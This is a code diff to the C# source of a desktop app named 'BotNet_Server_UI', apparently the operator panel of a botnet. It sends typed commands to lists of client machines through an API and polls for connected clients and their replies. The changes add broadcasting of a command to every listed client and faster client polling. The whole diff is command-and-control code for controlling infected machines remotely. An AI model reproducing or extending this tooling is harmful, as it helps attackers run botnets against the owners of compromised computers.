@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
@@ -13,6 +14,7 @@ namespace BotNet_Server_UI
     /// </summary>
     public partial class MainWindow : Window
     {
+        public bool ips;
         List<TextBox> textBoxes = new List<TextBox>();
         public MainWindow()
         {
@@ -21,7 +23,7 @@ namespace BotNet_Server_UI
 
         private async void Send_Command()
         {
-            if (Command.Text == "" || IP1.Text == "")
+            if (Command.Text == "")
             {
                 MessageBox.Show("Постарайтесь ввести все значения правильно!");
                 return;
@@ -31,13 +33,16 @@ namespace BotNet_Server_UI
                 Message message = new Message()
                 {
                     command = Command.Text,
-                    ip = new string[Convert.ToInt32(IPCount.Content.ToString())]
+                    ip = ips ? ClientList.Text.Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToArray() : new string[Convert.ToInt32(IPCount.Content.ToString())]
                 };
-                for (int i = 0; i < message.ip.Length; i++)
+                if (!ips)
                 {
-                    message.ip[i] = textBoxes[i].Text;
+                    for (int i = 0; i < message.ip.Length; i++)
+                    {
+                        message.ip[i] = textBoxes[i].Text;
+                    }
                 }
-                var res = await ApiRequest.CreateProductAsync(message, "messages");
+                Uri res = await ApiRequest.CreateProductAsync(message, "messages");
                 LogPanel.Text += $"Команда {message.command} (id: {await ApiRequest.GetProductAsync<uint>("api/v1/messages")}) отправлена.\n";
             }
             catch (Exception ex)
@@ -134,17 +139,12 @@ namespace BotNet_Server_UI
 
         private void Button_Click_1(object sender, RoutedEventArgs e)
         {
-            StartListenResponsesAsync();
+            StartListenAsync();
         }
 
         private async void StartListenAsync()
         {
             await Task.Run(() => ListenClients());
-            await Task.Run(() => ListenResponses());
-        }
-
-        private async void StartListenResponsesAsync()
-        {
             await Task.Run(() => ListenResponses());
         }
 
@@ -154,14 +154,22 @@ namespace BotNet_Server_UI
             {
                 while (true)
                 {
-                    var arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/ip");
+                    IP[] arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/ip");
+                    if (arr == null)
+                    {
+                        continue;
+                    }
                     string res = "";
                     for (int i = 0; i < arr.Length; i++)
                     {
+                        if (arr[i].ip == "")
+                        {
+                            continue;
+                        }
                         res += arr[i].ip + "\n";
                     }
                     await ClientList.Dispatcher.BeginInvoke(new Action(() => ClientList.Text = res));
-                    Thread.Sleep(30000);
+                    Thread.Sleep(7000);
                 }
             }
             catch (Exception ex)
@@ -218,6 +226,36 @@ namespace BotNet_Server_UI
             {
                 MessageBox.Show(ex.ToString());
             }
+        }
+
+        private void Size_Changed(object sender, SizeChangedEventArgs e)
+        {
+
+        }
+
+        public void BlockTextIP()
+        {
+            Button_Minus.IsEnabled = false;
+            Button_Plus.IsEnabled = false;
+            for (int i = 0; i < textBoxes.Count; i++)
+            {
+                textBoxes[i].IsEnabled = false;
+            }
+        }
+
+        public void UnblockTextIp()
+        {
+            Button_Minus.IsEnabled = true;
+            Button_Plus.IsEnabled = true;
+            for (int i = 0; i < textBoxes.Count; i++)
+            {
+                textBoxes[i].IsEnabled = true;
+            }
+        }
+        private void IPSetButton_Click(object sender, RoutedEventArgs e)
+        {
+            IPSet iPSet = new IPSet();
+            iPSet.Show();
         }
     }
 }
